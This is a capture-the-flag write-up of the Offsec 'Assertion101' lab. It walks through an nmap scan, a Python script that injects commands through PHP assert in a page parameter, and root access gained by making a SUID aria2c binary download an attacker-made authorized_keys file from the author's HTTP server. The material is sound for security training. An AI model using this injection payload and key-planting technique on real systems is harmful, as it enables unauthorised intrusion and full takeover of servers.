---
layout: post
title: "[Offsec] Assertion101 writeup"
categories: ctf offsec oscp
---

## Introduction

The challenge is at: [Offsec Labs Play](https://portal.offsec.com/labs/play)

![offsec](/assets/images/assertion101/offsec.png)

## Scanning

We start with a nmap scan as usual

```
> sudo nmap -v -AO -sC 192.168.194.94 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2024-06-16 23:51 CDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 23:51
Completed NSE at 23:51, 0.00s elapsed
Initiating NSE at 23:51
Completed NSE at 23:51, 0.00s elapsed
Initiating NSE at 23:51
Completed NSE at 23:51, 0.00s elapsed
Initiating Ping Scan at 23:51
Scanning 192.168.194.94 [4 ports]
Completed Ping Scan at 23:51, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:51
Completed Parallel DNS resolution of 1 host. at 23:51, 0.00s elapsed
Initiating SYN Stealth Scan at 23:51
Scanning 192.168.194.94 [65535 ports]
Discovered open port 80/tcp on 192.168.194.94
Discovered open port 22/tcp on 192.168.194.94
Completed SYN Stealth Scan at 23:52, 46.13s elapsed (65535 total ports)
Initiating Service scan at 23:52
Scanning 2 services on 192.168.194.94
Completed Service scan at 23:52, 6.12s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.194.94
Retrying OS detection (try #2) against 192.168.194.94
Retrying OS detection (try #3) against 192.168.194.94
Retrying OS detection (try #4) against 192.168.194.94
Retrying OS detection (try #5) against 192.168.194.94
Initiating Traceroute at 23:52
Completed Traceroute at 23:52, 0.05s elapsed
Initiating Parallel DNS resolution of 4 hosts. at 23:52
Completed Parallel DNS resolution of 4 hosts. at 23:52, 0.00s elapsed
NSE: Script scanning 192.168.194.94.
Initiating NSE at 23:52
Completed NSE at 23:52, 1.62s elapsed
Initiating NSE at 23:52
Completed NSE at 23:52, 0.19s elapsed
Initiating NSE at 23:52
Completed NSE at 23:52, 0.00s elapsed
Nmap scan report for 192.168.194.94
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:ce:aa:cc:02:de:a5:a3:58:5d:da:2b:ef:54:07:f9 (RSA)
|   256 9d:3f:df:16:7a:e1:59:58:84:4a:e3:29:8f:44:87:8d (ECDSA)
|_  256 87:b5:6f:f8:21:81:d3:3b:43:d0:40:81:c0:e3:69:89 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Assertion
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/16%OT=22%CT=1%CU=31994%PV=Y%DS=4%DC=T%G=Y%TM=666FC11
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=Z%II=I%TS=A)SEQ(SP=1
OS:02%GCD=1%ISR=10E%TI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%II=I%TS=A)
OS:SEQ(SP=106%GCD=1%ISR=10B%TI=Z%II=I%TS=A)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%II
OS:=I%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7
OS:%O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%
OS:W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G
OS:%RIPCK=G%RUCK=C4BA%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC
OS:K=G%RUCK=C5BA%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=C6BA%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=C
OS:7BA%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=C8BA%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 9.274 days (since Fri Jun  7 17:18:31 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   48.99 ms 192.168.45.1
2   48.42 ms 192.168.45.254
3   49.06 ms 192.168.251.1
4   49.10 ms 192.168.194.94

NSE: Script Post-scanning.
Initiating NSE at 23:52
Completed NSE at 23:52, 0.00s elapsed
Initiating NSE at 23:52
Completed NSE at 23:52, 0.00s elapsed
Initiating NSE at 23:52
Completed NSE at 23:52, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.63 seconds
           Raw packets sent: 65946 (2.906MB) | Rcvd: 65775 (2.658MB)
```

We'll take a look at the HTTP web service (port 80) for now. We'll use BurpSuite to log all the requests as we browse the site.

![chrome](/assets/images/assertion101/chrome.png)

Out of all the requests, this request stands out as the most promising one. We'll send this to repeater and try some attacks like SQL Injection, Directory Traversal, RFI, LFI, etc.

![target](/assets/images/assertion101/target.png)

![traverse](/assets/images/assertion101/dirtraverse.png)

After different tries, I realized the challenge title was a big suggestion about the approach: `assert` in PHP. Because `assert` takes an expression as the argument, it can be [tricked](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert) to run arbitary code. 

![assert](/assets/images/assertion101/assert.png)

At this point we can setup a reverse shell, but I wanted to keep every simple so I used a python script.

```py
import requests
import urllib.parse
import readline

headers = {
    'Host': '192.168.194.94',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.36 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://192.168.194.94/',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
}

while True:
    cmd = input("fake shell> ")
    cmd_encoded = urllib.parse.quote_plus(cmd)
    response = requests.get(f"http://192.168.194.94/index.php?page='+and+die(system('{cmd_encoded}'))+or+'", headers=headers, verify=False)
    print(response.text)
```

```
fake shell> id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
fake shell> ls -lah
total 196K
drwxr-xr-x 9 root root 4.0K Jan 16  2020 .
drwxr-xr-x 3 root root 4.0K Sep  8  2020 ..
drwxr-xr-x 2 root root 4.0K Jan 16  2020 .todeletelater
drwxr-xr-x 2 root root 4.0K Jan 16  2020 Source
-rwxr-xr-x 1 root root  21K Jan 16  2020 about.php
-rwxr-xr-x 1 root root  22K Jan 16  2020 blog-single.php
-rwxr-xr-x 1 root root  15K Jan 16  2020 blog.php
-rwxr-xr-x 1 root root  12K Jan 16  2020 contact.php
drwxr-xr-x 2 root root 4.0K Jan 16  2020 css
drwxr-xr-x 2 root root 4.0K Jan 16  2020 fonts
-rwxr-xr-x 1 root root  17K Jan 16  2020 gallery.php
drwxr-xr-x 9 root root 4.0K Jan 16  2020 img
-rwxr-xr-x 1 root root  37K Jan 16  2020 index.php
drwxr-xr-x 2 root root 4.0K Jan 16  2020 js
drwxr-xr-x 2 root root 4.0K Jan 16  2020 pages
-rwxr-xr-x 1 root root  24K Jan 16  2020 schedule.php
-rwxr-xr-x 1 root root  24K Jan 16  2020 schedule.php
fake shell> ls -lah ..
total 16K
drwxr-xr-x  3 root     root     4.0K Sep  8  2020 .
drwxr-xr-x 14 root     root     4.0K Jan 16  2020 ..
drwxr-xr-x  9 root     root     4.0K Jan 16  2020 html
-rw-r--r--  1 www-data www-data   33 Jun 20 21:30 local.txt
-rw-r--r--  1 www-data www-data   33 Jun 20 21:30 local.txt
fake shell> cat ../local.txt
f254e377dde28f08781cbf7282990a13
f254e377dde28f08781cbf7282990a13
```

## Privilege Escalation

We start off with finding all suid binaries.

```
fake shell> find /usr -perm -u=s -type f
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/at
/usr/bin/aria2c
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chfn
```

`/usr/bin/aria2c` stands out as the obvious odd one. Aria2 is a download ultility, let's check on GTFOBins.

![gtfo](/assets/images/assertion101/gtfo.png)

```
fake shell> echo "#!/bin/sh\nid > /tmp/id000" >> /tmp/test000.sh

fake shell> chmod a+x /tmp/test000.sh

fake shell> ls -lah /tmp/test000.sh
-rwxr-xr-x 1 www-data www-data 26 Jun 20 23:16 /tmp/test000.sh
-rwxr-xr-x 1 www-data www-data 26 Jun 20 23:16 /tmp/test000.sh
fake shell> aria2c --on-download-error=/tmp/test000.sh http://x

06/20 23:17:20 [NOTICE] Downloading 1 item(s)

06/20 23:17:20 [ERROR] CUID#7 - Download aborted. URI=http://x
Exception: [AbstractCommand.cc:351] errorCode=19 URI=http://x
  -> [AbstractCommand.cc:792] errorCode=19 CUID#7 - Name resolution for x failed:Could not contact DNS servers

06/20 23:17:20 [NOTICE] Download GID#3d5f9758308401a3 not complete: 

Download Results:
gid   |stat|avg speed  |path/URI
======+====+===========+=======================================================
3d5f97|ERR |        n/a|http://x

Status Legend:
(ERR):error occurred.

aria2 will resume download if the transfer is restarted.
If there are any errors, then see the log file. See '-l' option in help/man page for details.
If there are any errors, then see the log file. See '-l' option in help/man page for details.
fake shell> cat /tmp/id000
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

So the binary invokation works, but we're not root yet. Let's try downloading something with aria2c, and perhaps aria2c can write as root. For doing that, we setup a simple http server on host machine. I generated a pair of ssh key to write to `/root/.ssh/authorized_keys`

```
> ssh-keygen -t rsa -f id_rsa
> cp id_rsa.pub authorized_keys
> python -m http.server 9090
```

```
fake shell> aria2c -d /root/.ssh http://192.168.45.159:9090/authorized_keys --allow-overwrite=true

06/20 23:23:40 [NOTICE] Downloading 1 item(s)

06/20 23:23:40 [NOTICE] Download complete: /root/.ssh/authorized_keys

Download Results:
gid   |stat|avg speed  |path/URI
======+====+===========+=======================================================
a913d6|OK  |   183KiB/s|/root/.ssh/authorized_keys

Status Legend:
(OK):download completed.
(OK):download completed.
```

```
> ssh -i id_rsa -o IdentitiesOnly=yes root@192.168.194.94                                                                                       ~/Projects/OffSec/Labs/Assertion101@homes5
The authenticity of host '192.168.194.94 (192.168.194.94)' can't be established.
ED25519 key fingerprint is SHA256:h5lC324FZUjN4E597OGH1VIQAd8zwpigsGTeqy6ZhSU.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:24: 192.168.188.94
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.194.94' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 20 23:24:24 UTC 2024

  System load:  0.0                Processes:             160
  Usage of /:   34.0% of 19.56GB   Users logged in:       0
  Memory usage: 30%                IP address for ens192: 192.168.194.94
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

275 packages can be updated.
201 updates are security updates.


root@assertion:~# id
uid=0(root) gid=0(root) groups=0(root)
```

